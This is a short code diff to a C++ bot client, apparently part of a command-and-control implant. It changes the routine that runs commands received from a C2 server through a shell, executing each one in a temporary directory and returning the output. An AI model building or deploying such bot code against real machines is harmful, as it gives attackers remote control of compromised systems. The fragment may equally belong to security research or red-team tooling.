@@ -1,6 +1,5 @@
 #include "bot.hh"
 
-#include <iostream>
 #include <memory>
 #include <string>
 
@@ -64,17 +63,20 @@ Command::Command(std::string& c2_response) {
 }
 
 std::string Command::Execute() {
+    // Create a temporary directory and execute command within it
+    util::TempDirectory temp_dir(COMMAND_TEMP_DIR);
+    fs::current_path(temp_dir.Get());
+
     /* Add necessary syntax before and after command
      * depending on shell choice */
-    std::string string_to_exec;
-
-    if (shell == "default") {
-        string_to_exec = command_text;
-    } else {
+    if (shell != "default") {
         std::string pre_text, post_text;
         std::tie(pre_text, post_text) = SHELL_SYNTAX_LIST.at(shell.c_str());
-        string_to_exec = pre_text + command_text + post_text;
+        command_text = pre_text + command_text + post_text;
     }
 
-    return util::PopenSubprocess(string_to_exec.c_str());
+    std::string output = util::PopenSubprocess(command_text.c_str());
+    fs::current_path("../");
+
+    return output;
 }
